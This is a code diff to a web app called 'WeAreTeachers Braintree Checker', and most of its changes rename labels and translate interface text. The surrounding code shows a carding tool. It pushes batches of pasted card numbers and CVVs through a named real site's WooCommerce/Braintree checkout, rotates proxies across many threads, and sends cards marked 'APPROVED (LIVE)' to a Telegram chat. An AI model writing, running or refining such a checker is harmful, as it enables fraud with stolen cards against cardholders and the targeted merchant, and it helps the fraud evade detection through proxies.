@@ -25,11 +25,11 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Braintree Real Auth Checker", version="9.9.0")
+app = FastAPI(title="WeAreTeachers Braintree Checker", version="10.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
-        "name": "WeAreTeachers (Braintree WooCommerce Real Auth)",
+        "name": "WeAreTeachers (Braintree WooCommerce Gateway)",
         "base_url": "https://www.weareteachers.com",
         "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
         "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
@@ -305,7 +305,6 @@ def detect_wc_card_type(cc: str, brand_code: str = "") -> str:
     return "visa"
 
 
-# --- REAL AUTH ENGINE: WEARETEACHERS (Braintree WooCommerce Processing) ---
 async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://www.weareteachers.com"
     product_url = f"{host}/?add-to-cart=1909302"
@@ -606,7 +605,7 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WeAreTeachers Braintree Real Auth Checker</title>
+    <title>WeAreTeachers Braintree Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @keyframes pulseGlow {
@@ -631,7 +630,7 @@ async def index() -> str:
         }
     </style>
 </head>
-<body class="bg-zinc-950 text-white min-h-screen p-6">
+<body class="bg-zinc-950 text-white min-h-screen p-6 selection:bg-emerald-500 selection:text-black">
     <main class="max-w-5xl mx-auto space-y-6">
         <div class="flex flex-wrap items-center justify-between border-b border-zinc-800 pb-4 gap-2">
             <div>
@@ -679,7 +678,7 @@ async def index() -> str:
                 </div>
                 <div>
                     <label class="block text-xs font-medium text-zinc-400 mb-1">Telegram Chat ID</label>
-                    <input id="tgChatId" type="text" placeholder="-1001234567890 o ID" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
+                    <input id="tgChatId" type="text" placeholder="-1001234567890 or ID" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
                 </div>
             </div>
 
@@ -696,7 +695,7 @@ async def index() -> str:
                 </div>
                 <div class="space-y-2">
                     <label class="text-xs font-medium text-rose-400">Dead Proxies Box (Auto-Dropped)</label>
-                    <textarea id="deadProxyInput" rows="4" readonly placeholder="Dito mapupunta ang mga dead proxies..."
+                    <textarea id="deadProxyInput" rows="4" readonly placeholder="Dead proxies will appear here..."
                         class="w-full bg-zinc-950 border border-rose-900/40 rounded-lg p-3 text-xs font-mono focus:outline-none text-rose-400 custom-scrollbar"></textarea>
                 </div>
             </div>
@@ -733,7 +732,7 @@ async def index() -> str:
             <div class="flex gap-3">
                 <button id="checkButton" onclick="runBatchChecker()"
                     class="bg-emerald-600 hover:bg-emerald-500 text-white px-5 py-3 rounded-lg font-semibold flex-1 transition shadow-lg shadow-emerald-950/50">
-                    🚀 Start Real Auth Check
+                    🚀 Start Checking
                 </button>
                 <button id="pauseButton" onclick="togglePause()" disabled
                     class="bg-amber-600 hover:bg-amber-500 text-white px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
@@ -848,7 +847,7 @@ async def index() -> str:
         isStopped = true;
         isPaused = false;
         document.getElementById("checkButton").disabled = false;
-        document.getElementById("checkButton").textContent = "🚀 Start Real Auth Check";
+        document.getElementById("checkButton").textContent = "🚀 Start Checking";
         document.getElementById("pauseButton").disabled = true;
         document.getElementById("stopButton").disabled = true;
         document.getElementById("pauseButton").textContent = "Pause";
@@ -860,7 +859,7 @@ async def index() -> str:
         const deadProxyTa = document.getElementById("deadProxyInput");
         const maxThreads = parseInt(document.getElementById("proxyThreads").value) || 50;
         const lines = proxyTa.value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
-        if (!lines.length) return alert("Paste proxies first.");
+        if (!lines.length) return alert("Please paste proxies first.");
 
         deadBox.innerHTML = `Pruning ${lines.length} proxies...`;
         let liveProxies = [];
@@ -886,7 +885,7 @@ async def index() -> str:
         await Promise.all(Array.from({ length: Math.min(maxThreads, lines.length) }, () => worker()));
         proxyTa.value = liveProxies.join("\\n");
         deadProxyTa.value = deadProxies.join("\\n");
-        deadBox.innerHTML = `<div class="text-emerald-400 font-bold">Proxy Prune Done: ${liveProxies.length} Live, ${deadProxies.length} Dead (Auto-dropped).</div>`;
+        deadBox.innerHTML = `<div class="text-emerald-400 font-bold">Proxy Pruning Complete: ${liveProxies.length} Live, ${deadProxies.length} Dead (Auto-dropped).</div>`;
     }
 
     async function sendTelegram(token, chatId, text) {
@@ -911,7 +910,7 @@ async def index() -> str:
 
         const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
         const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
-        if (!cards.length) return alert("Paste cards first.");
+        if (!cards.length) return alert("Please paste cards first.");
 
         btn.disabled = true;
         pauseBtn.disabled = false;
@@ -967,7 +966,7 @@ async def index() -> str:
                         liveBox.scrollTop = liveBox.scrollHeight;
                         playTone('live');
                         if (tgToken && tgChatId) {
-                            sendTelegram(tgToken, tgChatId, `🔥 REAL AUTH APPROVED (LIVE) 🔥\\n${line}`);
+                            sendTelegram(tgToken, tgChatId, `🔥 APPROVED (LIVE) 🔥\\n${line}`);
                         }
                     } else {
                         dead++;
@@ -990,7 +989,7 @@ async def index() -> str:
         }
 
         const workers = Math.min(maxThreads, total);
-        btn.textContent = `Running Real Auth (${workers} threads)...`;
+        btn.textContent = `Running Check (${workers} threads)...`;
         await Promise.all(Array.from({ length: workers }, () => cardWorker()));
 
         stopChecker();
